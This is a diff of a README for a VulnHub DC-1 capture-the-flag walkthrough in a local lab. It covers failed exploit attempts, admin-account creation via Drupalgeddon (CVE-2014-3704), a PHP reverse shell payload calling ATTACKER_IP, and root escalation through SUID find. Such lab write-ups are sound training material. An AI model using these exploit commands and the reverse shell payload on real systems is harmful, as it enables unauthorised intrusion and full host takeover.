@@ -1,231 +1,197 @@
-# DC-1 (VulnHub) — Full Walkthrough  
-*Including failed attempts and final path to root*
+# DC-1 — VulnHub Pentest Walkthrough
 
-> **Target:** DC-1 (VulnHub)  
-> **Platform:** Linux / Drupal 7  
-> **Assessment Style:** Black-box / OSCP-style methodology  
-> **Author:** Nevin Mademba 
-> **Disclaimer:** This repository documents a **legal, local CTF** completed in a controlled lab environment.  
-> Do **not** use these techniques on systems you do not own or have explicit permission to test.
+**Target:** DC-1 (VulnHub)  
+**Operating System:** Linux (Debian)  
+**Primary Attack Vector:** Drupal 7 — CVE-2014-3704 (Drupalgeddon)  
+**Privilege Escalation:** Misconfigured SUID binary (`/usr/bin/find`)  
+**Assessment Style:** Black-box / OSCP-style methodology  
+**Result:** Full system compromise (root)
 
 ---
 
-## TL;DR — Attack Chain
+## Executive Summary
 
-1. **Recon:** Nmap → ports **22 / 80 / 111**
-2. **Enumeration:** HTTP fingerprinting → **Drupal 7**
-3. **Foothold:** **Drupalgeddon (CVE-2014-3704)** → admin user creation
-4. **RCE:** PHP Filter module → PHP reverse shell (`www-data`)
-5. **Privilege Escalation:** Misconfigured **SUID `/usr/bin/find`**
-6. **Result:** Root access + flags captured
+DC-1 is an intentionally vulnerable Linux host designed to simulate a real-world web application compromise scenario.  
+The system was fully compromised by exploiting a known Drupal 7 vulnerability to gain administrative access and remote code execution, followed by local privilege escalation due to an unsafe SUID configuration.
+
+This repository demonstrates:
+- A structured, repeatable pentesting methodology
+- Enumeration-driven exploitation
+- Analysis of failed exploitation attempts and decision-making pivots
+- A complete attack path from unauthenticated access to root
+
+All testing was conducted legally in a controlled lab environment.
+
+---
+
+## Attack Chain Overview
+
+1. **Reconnaissance**
+   - Network discovery and service enumeration
+   - Web service fingerprinted as Drupal 7
+
+2. **Initial Access**
+   - Exploited **CVE-2014-3704 (Drupalgeddon)**
+   - Created an administrative Drupal account
+
+3. **Remote Code Execution**
+   - Enabled PHP Filter module
+   - Executed a PHP reverse shell as `www-data`
+
+4. **Privilege Escalation**
+   - Discovered SUID-enabled `/usr/bin/find`
+   - Abused it to spawn a root shell
+
+5. **Outcome**
+   - Root-level access
+   - Complete host compromise
 
 ---
 
 ## Environment
 
-- **Attacker:** Kali Linux  
+- **Attacker Machine:** Kali Linux  
 - **Target IP (final run):** `192.168.56.102`  
-- **Attacker IP (listener):** `192.168.56.101`
+- **Attacker IP (listener):** `ATTACKER_IP`
 
-> Initial enumeration was performed using a NAT-style range (`10.0.2.6`) during setup and testing.  
-> Final exploitation and reporting were completed on the `192.168.56.0/24` host-only network.
+> Initial enumeration was performed using a NAT-style IP range during setup.  
+> Final exploitation and reporting were completed on a host-only network.
 
 ---
 
-## 1. Reconnaissance
+## Reconnaissance
 
-### Host Discovery
+### Network Discovery
+
 ```bash
 nmap -sn 192.168.56.0/24
-
----
-
 Port & Service Enumeration
 nmap -sS -A -T4 192.168.56.102
-
-
 Key Findings
+Port 80: Apache 2.2.22 (Debian)
 
-Port 80 → Apache 2.2.22 (Debian)
+CMS Identified: Drupal 7
 
-CMS identified as Drupal 7
-
-Additional services:
+Additional Services:
 
 SSH (22)
 
 RPCBind (111)
 
-2. Enumeration
+Enumeration
 Web Enumeration
-
-Browsed the application manually
-
-Identified a default Drupal installation
+Manual browsing revealed a default Drupal installation.
 
 Drupal Endpoint Testing
-
-/?q=user/1 → Access denied (page exists)
-
-/?q=user/2 → Access denied
-
-/?q=user/3 → Page not found
-
-These behaviors aligned with standard Drupal user handling and confirmed CMS fingerprinting.
+/?q=user/1  → Access denied (page exists)
+/?q=user/2  → Access denied
+/?q=user/3  → Page not found
+These responses aligned with standard Drupal user enumeration behavior and further confirmed the CMS fingerprint.
 
 Exploit Research
 searchsploit drupal 7
+This revealed multiple Drupal 7 attack vectors, including
+CVE-2014-3704 (Drupalgeddon).
 
+Failed Attempts (Documented Intentionally)
+This section reflects real-world pentesting conditions, where tooling and assumptions often fail before the environment does.
 
-This revealed multiple attack paths, including CVE-2014-3704 (Drupalgeddon).
-
-3. Failed Attempts (Documented Intentionally)
-
-This section reflects real-world pentesting where tools and assumptions often fail before the target does.
-
-❌ Attempt 1 — /CHANGELOG.txt Disclosure
+❌ Attempt 1 — Version Disclosure via CHANGELOG
 http://10.0.2.6/CHANGELOG.txt
-
-
 Result: 404 Not Found
-Lesson: Version files are not always exposed. Drupal was still confirmed via headers, page structure, and service fingerprinting.
 
-❌ Attempt 2 — Fragile Drupal PHP Exploits
+Takeaway:
+Version files are not always exposed. Drupal was still confidently identified through headers, page structure, and service fingerprinting.
 
-Tried older Drupal 7 PHP-based PoCs (e.g. 35150.php, 44355.php):
+❌ Attempt 2 — Fragile Drupal PHP Exploit PoCs
+Older Drupal 7 PHP-based exploits were tested in an attempt to achieve direct command execution.
 
 php 35150.php http://10.0.2.6 "id"
+Errors Observed
 
+include(common.inc): Failed to open stream
+please state the cookie url. It works only with https urls.
+Why It Failed
 
-Errors encountered
+Missing local dependencies
 
-Missing local dependencies (common.inc)
+HTTPS and cookie assumptions not present on the target
 
-HTTPS / cookie URL assumptions
+Decision:
+Abandoned brittle tooling in favor of a reliable and target-appropriate exploit.
 
-Why it failed
+❌ Attempt 3 — Drupalgeddon2 PoC Issues
+Tested 44448.py (Drupalgeddon2-era exploit).
 
-These exploits relied on environmental assumptions that were not present on the target.
-
-Pivot
-
-Abandoned brittle tooling in favor of a known reliable exploit.
-
-❌ Attempt 3 — Drupalgeddon2 PoC Issues (44448.py)
-
-Two major problems occurred:
-
-1. Python 2 input() evaluation
-Entering:
-
-http://10.0.2.6
-
-
-caused:
+Python 2 input() evaluation issue
 
 SyntaxError: invalid syntax
+Cause: Python 2 input() evaluates user input as code.
 
+Malformed request construction
 
-2. Malformed request construction
-The exploit attempted to connect to:
-
-10.0.2.6user
-
-
-Resulting in:
-
-requests.exceptions.ConnectionError
-
-
-Pivot
-
+HTTPConnectionPool(host='10.0.2.6user', ...)
+Decision:
 Drupalgeddon2 was unnecessary. DC-1 is reliably exploitable via CVE-2014-3704.
 
-❌ Attempt 4 — Incorrect Script Usage
+❌ Attempt 4 — Incorrect Script Invocation
 python2 34992.py -t http://10.0.2.6
-
-
-Output
-
 Usage: 34992.py -t http[s]://TARGET_URL -u USER -p PASS
+Note:
+This was not a real failure — required arguments were missing.
 
-
-Note: Not a real failure — required arguments were missing.
-
-4. Successful Exploitation Path
-✅ Step 1 — Drupalgeddon (CVE-2014-3704)
-
-Admin user creation using Metasploit’s public exploit:
-
+Successful Exploitation
+Initial Access — Drupalgeddon (CVE-2014-3704)
 python2 34992.py -t http://192.168.56.102 -u oscpadmin -p 'REDACTED'
-
-
 Result
 
 Administrative Drupal account created
 
-Full access to admin dashboard
+Full access to the Drupal admin dashboard
 
-✅ Step 2 — RCE via PHP Filter Module
+Remote Code Execution — PHP Filter Abuse
+From the Drupal administrative interface:
 
-From Drupal admin panel:
+Enabled the PHP Filter module
 
-Enable PHP Filter
-
-Create a page
+Created a new page
 
 Set Text format → PHP code
 
-Insert payload
+Inserted a reverse shell payload
 
 Listener
 
 nc -lvnp 4444
-
-
 Payload
 
 <?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
-
-
 Result
 
-Reverse shell as www-data
+Reverse shell obtained as www-data
 
-✅ Step 3 — Shell Stabilization
+Shell Stabilization
 python -c 'import pty; pty.spawn("/bin/bash")'
-
 whoami
 # www-data
-
-5. Privilege Escalation
+Privilege Escalation
 SUID Enumeration
 find / -perm -4000 2>/dev/null
-
-
 Finding
 
-/usr/bin/find has SUID bit set
-
+/usr/bin/find
 Exploitation
 /usr/bin/find . -exec /bin/bash -p \; -quit
-
 whoami
 # root
+Proof of Compromise (Redacted)
+cat /var/www/flag1.txt
+cat /var/www/sites/default/settings.php
+cat /root/thefinalflag.txt
+Flags, credentials, and sensitive values have been intentionally redacted.
 
-6. Proof of Compromise (Redacted)
-
-/var/www/flag1.txt
-
-settings.php contained database credentials and a flag
-
-/root/thefinalflag.txt
-
-Flags and credentials have been intentionally redacted.
-
-7. Impact
-
-Full web application compromise
+Impact
+Full web application takeover
 
 Remote code execution
 
@@ -233,11 +199,10 @@ Sensitive configuration disclosure
 
 Privilege escalation to root
 
-Complete host takeover
+Complete system compromise
 
-8. Remediation Recommendations
-
-Upgrade Drupal and remove vulnerable versions
+Remediation Recommendations
+Upgrade and patch Drupal installations
 
 Disable dangerous modules (e.g. PHP Filter)
 
@@ -248,14 +213,17 @@ Restrict access to configuration files
 Implement continuous patching and monitoring
 
 Lessons Learned
-
 Not all public exploits are production-ready
 
-Tooling failures require fast pivots
+Tooling failures require fast, informed pivots
 
-Documenting failed paths improves future efficiency
+Documenting failed paths improves efficiency and repeatability
 
 DC-1 strongly reinforces OSCP-style methodology:
+
 Enumerate → Exploit → Stabilize → Enumerate → PrivEsc
 
+Disclaimer
+This repository is for educational and portfolio purposes only.
+All techniques were executed against a local, intentionally vulnerable system.
 
